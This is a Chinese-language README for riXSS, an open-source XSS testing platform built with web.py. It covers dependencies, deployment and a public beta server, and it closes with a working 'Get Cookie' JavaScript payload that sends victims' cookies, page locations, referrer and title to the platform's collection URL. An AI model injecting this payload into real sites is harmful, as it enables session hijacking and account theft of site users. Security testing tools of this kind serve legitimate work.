riXSS
========
一个开源的XSS测试平台，采用web.py构建。
依赖暂时如下：

    web.py == 0.37
    jinja2 == 2.8-dev

所需环境为：

    Python 2.7
    Nginx
    uWSGI 1.9

我们推荐uWSGI方式部署。具体可参考：http://www.ricter.info/articles/125    
目前开发刚刚进行。如有愿意开发者请提issue :)

##删档测试声明
以目前的开发状态，大部分功能都可以完成。未公布文档，所以一些接口还未暴露。    
目前删档测试的地址：http://xss.lolilu.com   
测试配置状态：

    Ubuntu12.04
    Python2.7
    Nginx+uWSGI
    SQLite

测试时如果出现错误页面或者其他越权等情况，以及用户体验的情况，请提交issue。    
~~各位大大别黑我服务器啊~~    
测试完成后将会删除数据库。    
具体接口（添加模块）如下：

    {{ now_path }}：当前payload路径，payload应该以get方式当问{{ now_path }}（这是自己部署时候需要注意的）
    {{ id }}：要写入的项目序号

另外附上Get Cookie模块的Payload

    var x=new Image();
    try
    {
    var myopener='';
    myopener=window.opener && window.opener.location ? window.opener.location : '';
    }
    catch(err)
    {
    }
    x.src='{{ now_path }}?id={{ id }}&location='+escape(document.location)+'&toplocation='+escape(top.document.location)+'&cookie='+escape
    (document.cookie)+'&opener='+escape(myopener)+'&referrer='+escape(document.referrer)+'&title='+escape(document.title);

